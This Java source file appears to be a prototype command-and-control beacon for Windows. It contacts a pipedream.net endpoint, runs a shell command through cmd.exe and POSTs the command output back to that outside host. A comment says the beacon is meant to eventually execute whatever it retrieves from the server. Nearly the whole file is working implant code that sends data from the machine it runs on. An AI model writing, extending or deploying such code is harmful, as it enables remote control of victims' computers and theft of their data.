// https://www.javaguides.net/2019/07/java-http-getpost-request-example.html
// https://www.stackhawk.com/blog/command-injection-java/

package baconStrips;
import java.util.*;
import java.io.BufferedReader;
import java.io.OutputStream;
import java.io.IOException;
import java.io.InputStreamReader;
import java.net.HttpURLConnection;
import java.net.URL;

public class beacon {

    private static final String USER_AGENT = "Mozilla/5.0 (Windows NT 6.1)";
    private static String storage1[] = null;
    public static void main(String[] args) throws IOException {
        sendHttpGETRequest("https://eoqqzdfuzmgq7gg.m.pipedream.net/");
        BufferedReader stdInput = ExecuteMe("dir"); // this will eventually execute the retrieved contents from above
        StringBuffer temp = new StringBuffer();
        String s = null;
        while ((s = stdInput.readLine()) != null) { // 
            String storage1[] = {s};
            int i;
            for(String x: storage1) {
                temp.append(x);
            }
        }
        PostMe("https://eoqqzdfuzmgq7gg.m.pipedream.net/",temp);
    }
    private static void PostMe(String POST_URL, StringBuffer POST_PARAMS) throws IOException{
        URL obj = new URL(POST_URL);
        HttpURLConnection httpURLConnection = (HttpURLConnection) obj.openConnection();
        httpURLConnection.setRequestMethod("POST");
        httpURLConnection.setRequestProperty("User-Agent", USER_AGENT);

        httpURLConnection.setDoOutput(true);
        OutputStream os = httpURLConnection.getOutputStream();
        String str_params = POST_PARAMS.toString(); // convert the string buffer to a string
        os.write(str_params.getBytes()); // get the bytes of it

        int responseCode = httpURLConnection.getResponseCode();

        if (responseCode == HttpURLConnection.HTTP_OK) { // success
            BufferedReader in = new BufferedReader(new InputStreamReader(httpURLConnection.getInputStream()));
            String inputLine;
            StringBuffer response = new StringBuffer();

            while ((inputLine = in .readLine()) != null) {
                response.append(inputLine);
            } in .close();

            // print result
            System.out.println(response.toString());
        } else {
            System.out.println("POST request not worked");
        }
    }

    private static void sendHttpGETRequest(String GET_URL) throws IOException {
        URL obj = new URL(GET_URL);
        HttpURLConnection httpURLConnection = (HttpURLConnection) obj.openConnection();
        httpURLConnection.setRequestMethod("GET");
        httpURLConnection.setRequestProperty("User-Agent", USER_AGENT);
        int responseCode = httpURLConnection.getResponseCode();
        if (responseCode == HttpURLConnection.HTTP_OK) { // success
            BufferedReader in = new BufferedReader(new InputStreamReader(httpURLConnection.getInputStream()));
            String inputLine;
            StringBuffer response = new StringBuffer();

            while ((inputLine = in .readLine()) != null) {
                response.append(inputLine);
            } in .close();
        } else {
            ;
        }
    }
    private static BufferedReader ExecuteMe(String command) throws IOException{
         // construct the execution statement
        String constructed_command = "cmd.exe /c" + command;
        try {
            Process process = Runtime.getRuntime().exec(constructed_command);
            BufferedReader stdInput = new BufferedReader(new InputStreamReader(process.getInputStream()));

            return stdInput;
        }
        finally{
            ;
        }
    }
}